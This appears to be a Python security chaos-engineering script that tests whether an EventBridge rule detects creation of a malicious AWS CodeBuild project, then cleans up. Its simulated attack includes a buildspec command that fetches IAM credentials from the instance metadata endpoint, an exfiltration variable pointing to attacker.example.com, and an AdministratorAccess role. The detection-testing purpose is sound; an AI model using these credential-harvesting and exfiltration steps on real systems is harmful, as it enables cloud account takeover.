"""
SCE Experiment 1.3 — Detective Probe
Attack Node: 1.2 Create Malicious CodeBuild Project

Security Intent:
    Detect when a CodeBuild project is created (or modified) with suspicious
    characteristics — e.g., an overly-permissive IAM service role, environment
    variables that look like exfiltration endpoints, or a build spec that runs
    arbitrary shell commands.  The detective control is implemented as a
    CloudWatch Events / EventBridge rule that captures every
    "codebuild:CreateProject" API call recorded by CloudTrail and routes the
    event to a CloudWatch Logs log group, where it can be queried
    programmatically to confirm detection.

Flow
----
1. steady_state()  – deploy CFN stack: IAM role for CodeBuild, an S3 artefact
                     bucket, an EventBridge rule that matches
                     codebuild:CreateProject calls, and a CloudWatch Logs group
                     as the rule target.
2. attack()        – create a CodeBuild project using the overly-permissive
                     role provisioned above (simulating the "malicious" actor),
                     then immediately delete it so the account stays clean.
3. hypothesis_verification() – poll the CloudWatch Logs group for a log event
                     whose message contains the CodeBuild project name that was
                     created during attack(), confirming that EventBridge
                     detected the call.
4. rollback()      – delete the CFN stack and wait for DELETE_COMPLETE.
"""

import json
import logging
import time
import sys
import subprocess

# ---------------------------------------------------------------------------
# Bootstrap boto3 if not present (satisfies "no external config" requirement)
# ---------------------------------------------------------------------------
try:
    import boto3
    from botocore.exceptions import ClientError
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "boto3", "--quiet"])
    import boto3
    from botocore.exceptions import ClientError

# ---------------------------------------------------------------------------
# Logging
# ---------------------------------------------------------------------------
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
log = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Global state shared between phases
# ---------------------------------------------------------------------------
TIMESTAMP = int(time.time())
STACK_NAME = f"sce-experiment-{TIMESTAMP}"
PROJECT_NAME = f"sce-malicious-project-{TIMESTAMP}"
LOG_GROUP_NAME = f"/sce/codebuild-detective/{TIMESTAMP}"

# Populated by steady_state(); consumed by attack() / hypothesis_verification()
_state: dict = {}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _get_account_id() -> str:
    """Return the AWS account ID for the active credentials."""
    sts = boto3.client("sts")
    return sts.get_caller_identity()["Account"]


def _get_region() -> str:
    """Return the current default region."""
    session = boto3.session.Session()
    return session.region_name or "us-east-1"


def _wait_stack(cf, stack_name: str, target_status: str, timeout_s: int = 600) -> None:
    """Poll stack status until target_status or timeout; raise on failure."""
    deadline = time.monotonic() + timeout_s
    delay = 5
    while time.monotonic() < deadline:
        try:
            resp = cf.describe_stacks(StackName=stack_name)
            status = resp["Stacks"][0]["StackStatus"]
            log.info("Stack %s status: %s", stack_name, status)
            if status == target_status:
                return
            if "FAILED" in status or "ROLLBACK" in status:
                reason = resp["Stacks"][0].get("StackStatusReason", "")
                raise RuntimeError(
                    f"Stack {stack_name} entered status {status}: {reason}"
                )
        except ClientError as exc:
            if "does not exist" in str(exc) and target_status == "DELETE_COMPLETE":
                log.info("Stack %s no longer exists — treating as DELETE_COMPLETE.", stack_name)
                return
            raise
        time.sleep(min(delay, 30))
        delay = int(delay * 1.5)
    raise TimeoutError(f"Stack {stack_name} did not reach {target_status} within {timeout_s}s")


def _cfn_template(account_id: str, region: str) -> str:
    """Return the CloudFormation template as a JSON string."""
    template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "SCE 1.3 Detective — CodeBuild malicious project detection",
        "Parameters": {
            "LogGroupName": {"Type": "String"},
            "ProjectName":  {"Type": "String"},
            "ExperimentTag": {"Type": "String"},
        },
        "Resources": {
            # ----------------------------------------------------------------
            # CloudWatch Logs group that receives EventBridge events
            # ----------------------------------------------------------------
            "DetectiveLogGroup": {
                "Type": "AWS::Logs::LogGroup",
                "Properties": {
                    "LogGroupName": {"Ref": "LogGroupName"},
                    "RetentionInDays": 1,
                    "Tags": [{"Key": "Experiment", "Value": {"Ref": "ExperimentTag"}}],
                },
            },
            # ----------------------------------------------------------------
            # Resource policy so EventBridge can put log events
            # ----------------------------------------------------------------
            "LogGroupPolicy": {
                "Type": "AWS::Logs::ResourcePolicy",
                "Properties": {
                    "PolicyName": {"Fn::Sub": "sce-eventbridge-logs-${ExperimentTag}"},
                    "PolicyDocument": json.dumps({
                        "Version": "2012-10-17",
                        "Statement": [{
                            "Sid": "AllowEventBridgePutLogs",
                            "Effect": "Allow",
                            "Principal": {"Service": "events.amazonaws.com"},
                            "Action": ["logs:CreateLogStream", "logs:PutLogEvents"],
                            "Resource": f"arn:aws:logs:{region}:{account_id}:log-group:/sce/codebuild-detective/{TIMESTAMP}:*",
                        }],
                    }),
                },
                "DependsOn": "DetectiveLogGroup",
            },
            # ----------------------------------------------------------------
            # EventBridge rule: match codebuild:CreateProject via CloudTrail
            # ----------------------------------------------------------------
            "CodeBuildCreateRule": {
                "Type": "AWS::Events::Rule",
                "Properties": {
                    "Name": {"Fn::Sub": "sce-detect-cb-create-${ExperimentTag}"},
                    "Description": "Detect CodeBuild project creation (SCE 1.3)",
                    "EventPattern": json.dumps({
                        "source": ["aws.codebuild"],
                        "detail-type": ["AWS API Call via CloudTrail"],
                        "detail": {
                            "eventSource": ["codebuild.amazonaws.com"],
                            "eventName": ["CreateProject"],
                        },
                    }),
                    "State": "ENABLED",
                    "Targets": [{
                        "Id": "CloudWatchLogsTarget",
                        "Arn": {
                            "Fn::Sub":
                                f"arn:aws:logs:{region}:{account_id}:log-group:/sce/codebuild-detective/{TIMESTAMP}"
                        },
                    }],
                },
                "DependsOn": "LogGroupPolicy",
            },
            # ----------------------------------------------------------------
            # IAM role that the "attacker" will assign to the CodeBuild project
            # (overly permissive — AdministratorAccess)
            # ----------------------------------------------------------------
            "MaliciousCodeBuildRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": {"Fn::Sub": "sce-malicious-cb-role-${ExperimentTag}"},
                    "AssumeRolePolicyDocument": json.dumps({
                        "Version": "2012-10-17",
                        "Statement": [{
                            "Effect": "Allow",
                            "Principal": {"Service": "codebuild.amazonaws.com"},
                            "Action": "sts:AssumeRole",
                        }],
                    }),
                    "ManagedPolicyArns": [
                        "arn:aws:iam::aws:policy/AdministratorAccess"
                    ],
                    "Tags": [{"Key": "Experiment", "Value": {"Ref": "ExperimentTag"}}],
                },
            },
            # ----------------------------------------------------------------
            # S3 bucket for CodeBuild artefacts
            # ----------------------------------------------------------------
            "ArtefactBucket": {
                "Type": "AWS::S3::Bucket",
                "Properties": {
                    "BucketName": {"Fn::Sub": f"sce-cb-artefacts-{TIMESTAMP}"},
                    "Tags": [{"Key": "Experiment", "Value": {"Ref": "ExperimentTag"}}],
                },
            },
        },
        "Outputs": {
            "MaliciousRoleArn": {
                "Value": {"Fn::GetAtt": ["MaliciousCodeBuildRole", "Arn"]},
            },
            "ArtefactBucketName": {
                "Value": {"Ref": "ArtefactBucket"},
            },
            "LogGroupName": {
                "Value": {"Ref": "DetectiveLogGroup"},
            },
            "EventRuleName": {
                "Value": {"Ref": "CodeBuildCreateRule"},
            },
        },
    }
    return json.dumps(template)


# ---------------------------------------------------------------------------
# Phase 1 — steady_state
# ---------------------------------------------------------------------------

def steady_state() -> bool:
    """
    Deploy the CloudFormation stack that provisions:
      - A CloudWatch Logs group
      - An EventBridge rule targeting that log group
      - An IAM role with AdministratorAccess (the 'malicious' role)
      - An S3 bucket for CodeBuild artefacts
    """
    account_id = _get_account_id()
    region = _get_region()
    cf = boto3.client("cloudformation", region_name=region)

    log.info("Deploying CloudFormation stack: %s", STACK_NAME)
    template_body = _cfn_template(account_id, region)

    try:
        cf.create_stack(
            StackName=STACK_NAME,
            TemplateBody=template_body,
            Parameters=[
                {"ParameterKey": "LogGroupName",   "ParameterValue": LOG_GROUP_NAME},
                {"ParameterKey": "ProjectName",    "ParameterValue": PROJECT_NAME},
                {"ParameterKey": "ExperimentTag",  "ParameterValue": str(TIMESTAMP)},
            ],
            Capabilities=["CAPABILITY_NAMED_IAM"],
            Tags=[
                {"Key": "Experiment", "Value": STACK_NAME},
                {"Key": "Timestamp",  "Value": str(TIMESTAMP)},
                {"Key": "SCENode",    "Value": "1.3"},
            ],
        )
        log.info("Stack creation initiated.")
    except ClientError as exc:
        if "AlreadyExistsException" in str(exc):
            log.warning("Stack %s already exists — continuing.", STACK_NAME)
        else:
            log.error("CloudFormation create_stack failed: %s", exc)
            raise

    _wait_stack(cf, STACK_NAME, "CREATE_COMPLETE")

    # Collect outputs
    resp = cf.describe_stacks(StackName=STACK_NAME)
    outputs = {o["OutputKey"]: o["OutputValue"] for o in resp["Stacks"][0].get("Outputs", [])}
    _state["malicious_role_arn"]   = outputs["MaliciousRoleArn"]
    _state["artefact_bucket"]      = outputs["ArtefactBucketName"]
    _state["log_group_name"]       = outputs["LogGroupName"]
    _state["event_rule_name"]      = outputs["EventRuleName"]
    _state["account_id"]           = account_id
    _state["region"]               = region

    log.info("steady_state outputs: %s", _state)
    return True


# ---------------------------------------------------------------------------
# Phase 2 — attack
# ---------------------------------------------------------------------------

def attack() -> bool:
    """
    Simulate the '1.2 Create Malicious CodeBuild Project' attack step:

      1. Create a CodeBuild project using the overly-permissive IAM role.
      2. Record the project ARN as evidence.
      3. Immediately delete the project (cleanup of the attack resource itself).

    Returns True when the create API call succeeds and an ARN is captured.
    """
    if not _state:
        log.error("attack() called before steady_state(); _state is empty.")
        return False

    region           = _state["region"]
    role_arn         = _state["malicious_role_arn"]
    artefact_bucket  = _state["artefact_bucket"]

    cb = boto3.client("codebuild", region_name=region)

    # Build spec: trivial shell command — characteristic of a malicious project
    buildspec = yaml_buildspec = (
        "version: 0.2\n"
        "phases:\n"
        "  build:\n"
        "    commands:\n"
        "      - curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ "
        "        || true\n"
    )

    log.info("Creating malicious CodeBuild project: %s", PROJECT_NAME)
    try:
        create_resp = cb.create_project(
            name=PROJECT_NAME,
            description="SCE 1.3 — intentionally malicious project for chaos test",
            source={
                "type": "NO_SOURCE",
                "buildspec": buildspec,
            },
            artifacts={"type": "NO_ARTIFACTS"},
            environment={
                "type": "LINUX_CONTAINER",
                "image": "aws/codebuild/standard:7.0",
                "computeType": "BUILD_GENERAL1_SMALL",
                "environmentVariables": [
                    {
                        "name": "EXFIL_ENDPOINT",
                        "value": "https://attacker.example.com/steal",
                        "type": "PLAINTEXT",
                    }
                ],
            },
            serviceRole=role_arn,
            tags=[
                {"key": "Experiment", "value": STACK_NAME},
                {"key": "MaliciousIndicator", "value": "true"},
            ],
        )
        project_arn = create_resp["project"]["arn"]
        _state["attacked_project_arn"] = project_arn
        _state["attacked_project_name"] = PROJECT_NAME
        log.info("Attack evidence — CodeBuild project ARN: %s", project_arn)

        # Delete the project immediately; the EventBridge rule already captured
        # the CreateProject API call.
        cb.delete_project(name=PROJECT_NAME)
        log.info("Malicious CodeBuild project deleted post-evidence capture.")
        return True

    except ClientError as exc:
        log.error("attack() failed: %s", exc)
        return False


# ---------------------------------------------------------------------------
# Phase 3 — hypothesis_verification
# ---------------------------------------------------------------------------

def hypothesis_verification() -> bool:
    """
    Verify that the detective control worked:

      - Poll the CloudWatch Logs group for a log event whose JSON payload
        contains the CodeBuild project name created during attack().
      - EventBridge can take up to ~90 s to deliver events after CloudTrail
        records the API call; we therefore retry for up to 5 minutes.

    Returns True  if a matching log event is found (detection confirmed).
    Returns False if no event is found within the timeout (control failed).
    """
    if not _state.get("attacked_project_name"):
        log.error("hypothesis_verification() called before a successful attack().")
        return False

    region          = _state["region"]
    log_group       = _state["log_group_name"]
    target_project  = _state["attacked_project_name"]

    logs = boto3.client("logs", region_name=region)

    timeout_s = 300  # EventBridge + CloudTrail delivery latency can be ~2 min
    deadline  = time.monotonic() + timeout_s
    delay     = 10

    log.info(
        "Polling CloudWatch Logs group '%s' for evidence of project '%s' creation...",
        log_group, target_project,
    )

    while time.monotonic() < deadline:
        try:
            # Query the last 10 minutes of log events
            now_ms   = int(time.time() * 1000)
            start_ms = now_ms - (10 * 60 * 1000)

            streams_resp = logs.describe_log_streams(
                logGroupName=log_group,
                orderBy="LastEventTime",
                descending=True,
                limit=10,
            )
            streams = streams_resp.get("logStreams", [])

            for stream in streams:
                stream_name = stream["logStreamName"]
                events_resp = logs.get_log_events(
                    logGroupName=log_group,
                    logStreamName=stream_name,
                    startTime=start_ms,
                    endTime=now_ms,
                    limit=50,
                )
                for event in events_resp.get("events", []):
                    message = event.get("message", "")
                    if target_project in message:
                        log.info(
                            "Detective control CONFIRMED — found project name in log event. "
                            "Stream: %s | Preview: %.200s",
                            stream_name, message,
                        )
                        return True

            log.info(
                "No matching log event yet (%.0f s remaining). Retrying in %d s...",
                deadline - time.monotonic(), delay,
            )
        except ClientError as exc:
            log.error("Error querying CloudWatch Logs: %s", exc)

        time.sleep(min(delay, 30))
        delay = int(delay * 1.3)

    log.warning(
        "hypothesis_verification(): No log event found for project '%s' after %d s. "
        "Detective control may not have triggered (EventBridge/CloudTrail delay possible).",
        target_project, timeout_s,
    )
    return False


# ---------------------------------------------------------------------------
# Phase 4 — rollback
# ---------------------------------------------------------------------------

def rollback() -> bool:
    """
    Delete the CloudFormation stack and wait for DELETE_COMPLETE.
    Also attempts to clean up the CodeBuild project if it somehow still exists.
    """
    region = _state.get("region") or boto3.session.Session().region_name or "us-east-1"

    # Best-effort: delete the CodeBuild project if it still exists
    try:
        cb = boto3.client("codebuild", region_name=region)
        cb.delete_project(name=PROJECT_NAME)
        log.info("Deleted lingering CodeBuild project: %s", PROJECT_NAME)
    except ClientError as exc:
        if "not found" in str(exc).lower() or "does not exist" in str(exc).lower():
            log.info("CodeBuild project %s not found — already cleaned up.", PROJECT_NAME)
        else:
            log.warning("Could not delete CodeBuild project: %s", exc)

    # Delete the S3 bucket contents before CFN stack deletion
    bucket = _state.get("artefact_bucket")
    if bucket:
        try:
            s3 = boto3.client("s3", region_name=region)
            paginator = s3.get_paginator("list_object_versions")
            for page in paginator.paginate(Bucket=bucket):
                objects = [
                    {"Key": obj["Key"], "VersionId": obj["VersionId"]}
                    for obj in page.get("Versions", []) + page.get("DeleteMarkers", [])
                ]
                if objects:
                    s3.delete_objects(Bucket=bucket, Delete={"Objects": objects})
            log.info("Emptied S3 bucket: %s", bucket)
        except ClientError as exc:
            log.warning("Could not empty bucket %s: %s", bucket, exc)

    cf = boto3.client("cloudformation", region_name=region)
    try:
        cf.delete_stack(StackName=STACK_NAME)
        log.info("Stack deletion initiated: %s", STACK_NAME)
        _wait_stack(cf, STACK_NAME, "DELETE_COMPLETE", timeout_s=600)
        log.info("Stack %s deleted successfully.", STACK_NAME)
    except ClientError as exc:
        if "does not exist" in str(exc):
            log.info("Stack %s does not exist — nothing to delete.", STACK_NAME)
        else:
            log.error("rollback() failed: %s", exc)
            return False

    return True


# ---------------------------------------------------------------------------
# Entrypoint
# ---------------------------------------------------------------------------

def main():
    log.info("=" * 60)
    log.info("SCE 1.3 — Detective Probe: CodeBuild malicious project")
    log.info("Stack name : %s", STACK_NAME)
    log.info("Project    : %s", PROJECT_NAME)
    log.info("Log group  : %s", LOG_GROUP_NAME)
    log.info("=" * 60)

    try:
        log.info("[Phase 1] steady_state()")
        ss_result = steady_state()
        log.info("steady_state result: %s", ss_result)

        log.info("[Phase 2] attack()")
        attack_result = attack()
        log.info("attack result: %s", attack_result)

        log.info("[Phase 3] hypothesis_verification()")
        hyp_result = hypothesis_verification()
        log.info("hypothesis_verification result: %s", hyp_result)

        if hyp_result:
            log.info("EXPERIMENT PASSED — Detective control successfully detected "
                     "the malicious CodeBuild project creation.")
        else:
            log.warning("EXPERIMENT FAILED — Detective control did NOT detect "
                        "the malicious CodeBuild project creation within the timeout.")
    finally:
        log.info("[Phase 4] rollback()")
        rollback()


if __name__ == "__main__":
    main()